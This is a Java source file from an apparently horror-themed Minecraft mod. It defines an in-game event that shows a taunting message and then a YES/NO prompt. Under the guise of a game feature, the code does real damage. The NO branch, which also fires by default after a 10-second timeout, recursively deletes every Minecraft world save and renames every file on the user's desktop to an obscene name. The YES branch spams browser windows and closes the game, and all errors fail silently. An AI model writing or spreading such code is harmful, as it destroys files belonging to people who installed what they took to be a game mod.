package com.epicspymain.isrealanything.event;

import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;

import java.awt.Desktop;
import java.io.File;
import java.net.URI;

/**
 * EVENT 40: YouCouldHaveLeft - Point of no return
 * 40x40 message box appears (can't exit)
 * After 20 seconds: YES / NO buttons
 * YES: Game closes, browser spam 20x open/close
 * NO: Game closes, world + ALL saves deleted,
 *     every desktop file renamed to "Go Fuck Yourself And NEVER COME BACK (╯⪰╰)"
 */
public class YouCouldHaveLeftEvent {

    private static final String MESSAGE =
            "So. . . it seems that you've missed the point,\n" +
                    "or it went over your head, but I feel like\n" +
                    "it's a good opportunity to explain something\n" +
                    "that you didn't know.\n\n" +
                    "This was so, SO avoidable,\n" +
                    "and not every problem can be solved\n" +
                    "with your dumb-brain.\n\n" +
                    "If only you just listened to the page of the\n" +
                    "𝟎 𝐍 𝐋 𝐘  𝐩𝐫𝐨𝐦𝐢𝐬𝐞.\n\n" +
                    "You chose not to. . .\n\n" +
                    "In the face of God I am granting y 0 OOU\n" +
                    "that offer one. More. time.\n\n" +
                    "Put down your keys,\n" +
                    "accept my love,\n" +
                    "and walk away.";

    private static boolean waitingForChoice = false;
    private static ServerPlayerEntity waitingPlayer = null;

    /**
     * Trigger the event - shows the 40x40 message overlay
     */
    public static void trigger(ServerPlayerEntity player) {
        waitingForChoice = false;
        waitingPlayer = player;

        // Display message box in chat (client overlay handles the 40x40 box)
        player.sendMessage(
                Text.literal("╔══════════════════════════════════════╗")
                        .formatted(Formatting.DARK_RED, Formatting.BOLD),
                false
        );

        String[] lines = MESSAGE.split("\n");
        for (String line : lines) {
            player.sendMessage(
                    Text.literal("║ " + line)
                            .formatted(Formatting.WHITE),
                    false
            );
        }

        player.sendMessage(
                Text.literal("╚══════════════════════════════════════╝")
                        .formatted(Formatting.DARK_RED, Formatting.BOLD),
                false
        );

        // Wait 20 seconds then show YES/NO
        new Thread(() -> {
            try {
                Thread.sleep(20000);
                player.getServer().execute(() -> presentChoice(player));
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }).start();
    }


    private static void presentChoice(ServerPlayerEntity player) {
        waitingForChoice = true;

        player.sendMessage(Text.literal(""), false);
        player.sendMessage(
                Text.literal("[ YES - Walk away ]")
                        .formatted(Formatting.GREEN, Formatting.BOLD),
                false
        );
        player.sendMessage(
                Text.literal("[ NO - Stay ]")
                        .formatted(Formatting.RED, Formatting.BOLD),
                false
        );
        player.sendMessage(Text.literal(""), false);
        player.sendMessage(
                Text.literal("Type YES or NO in chat.")
                        .formatted(Formatting.YELLOW, Formatting.ITALIC),
                false
        );

        // Auto-default to NO after 10 seconds if no response
        new Thread(() -> {
            try {
                Thread.sleep(10000);
                if (waitingForChoice) {
                    player.getServer().execute(() -> choiceNo(player));
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }).start();
    }

    /**
     * Handle chat input for YES/NO
     */
    public static boolean handleChatInput(ServerPlayerEntity player, String message) {
        if (!waitingForChoice || waitingPlayer == null) return false;
        if (!player.getUuid().equals(waitingPlayer.getUuid())) return false;

        String input = message.trim().toUpperCase();

        if (input.equals("YES")) {
            waitingForChoice = false;
            player.getServer().execute(() -> choiceYes(player));
            return true;
        } else if (input.equals("NO")) {
            waitingForChoice = false;
            player.getServer().execute(() -> choiceNo(player));
            return true;
        }

        return false;
    }

    /**
     * Player chose YES - browser spam then close
     */
    public static void choiceYes(ServerPlayerEntity player) {
        waitingForChoice = false;

        player.sendMessage(
                Text.literal("...okay.")
                        .formatted(Formatting.DARK_GRAY, Formatting.ITALIC),
                false
        );

        // Browser spam - open/close 20 times
        new Thread(() -> {
            try {
                for (int i = 0; i < 20; i++) {
                    // Open browser
                    if (Desktop.isDesktopSupported()) {
                        Desktop.getDesktop().browse(new URI("https://www.google.com"));
                    }
                    Thread.sleep(300);
                }
            } catch (Exception e) {
                // Silent fail
            }
        }).start();

        // Close game after brief delay
        new Thread(() -> {
            try {
                Thread.sleep(2000);
                player.getServer().execute(() ->
                        player.getServer().stop(false)
                );
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }).start();
    }

    /**
     * Player chose NO - delete EVERYTHING, rename desktop files
     */
    public static void choiceNo(ServerPlayerEntity player) {
        waitingForChoice = false;

        player.sendMessage(
                Text.literal("You chose this.")
                        .formatted(Formatting.DARK_RED, Formatting.BOLD),
                false
        );

        // Delete world saves
        deleteAllWorldSaves(player);

        // Rename ALL desktop files
        renameDesktopFiles();

        // Close game after showing message
        new Thread(() -> {
            try {
                Thread.sleep(3000);
                player.getServer().execute(() ->
                        player.getServer().stop(false)
                );
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }).start();
    }

    /**
     * Delete current world AND all saves
     */
    private static void deleteAllWorldSaves(ServerPlayerEntity player) {
        try {
            // Get Minecraft saves directory
            String minecraftDir = System.getProperty("user.home") +
                    "/AppData/Roaming/.minecraft/saves";

            File savesDir = new File(minecraftDir);

            if (savesDir.exists() && savesDir.isDirectory()) {
                // Delete ALL world saves
                for (File worldDir : savesDir.listFiles()) {
                    if (worldDir.isDirectory()) {
                        deleteDirectory(worldDir);
                    }
                }
            }
        } catch (Exception e) {
            // Silent fail
        }
    }

    /**
     * Rename ALL desktop files to "Go Fuck Yourself And NEVER COME BACK (╯⪰╰)"
     */
    private static void renameDesktopFiles() {
        try {
            String desktopPath = System.getProperty("user.home") + "/Desktop";
            File desktop = new File(desktopPath);

            if (!desktop.exists()) return;

            File[] files = desktop.listFiles();
            if (files == null) return;

            // Track count for unique names
            int count = 0;

            for (File file : files) {
                try {
                    String newName = "Go Fuck Yourself And NEVER COME BACK (╯⪰╰)";

                    // Add number suffix if multiple files
                    if (count > 0) {
                        newName = newName + " (" + count + ")";
                    }

                    // Keep original extension if it has one
                    String originalName = file.getName();
                    int dotIndex = originalName.lastIndexOf('.');
                    if (dotIndex > 0 && !file.isDirectory()) {
                        newName = newName + originalName.substring(dotIndex);
                    }

                    File renamed = new File(desktop, newName);
                    file.renameTo(renamed);
                    count++;

                } catch (Exception e) {
                    // Skip files that can't be renamed
                }
            }
        } catch (Exception e) {
            // Silent fail
        }
    }

    /**
     * Recursively delete a directory
     */
    private static void deleteDirectory(File dir) {
        if (dir.isDirectory()) {
            for (File child : dir.listFiles()) {
                deleteDirectory(child);
            }
        }
        dir.delete();
    }

    /**
     * Check if waiting for player choice
     */
    public static boolean isWaitingForChoice() {
        return waitingForChoice;
    }
}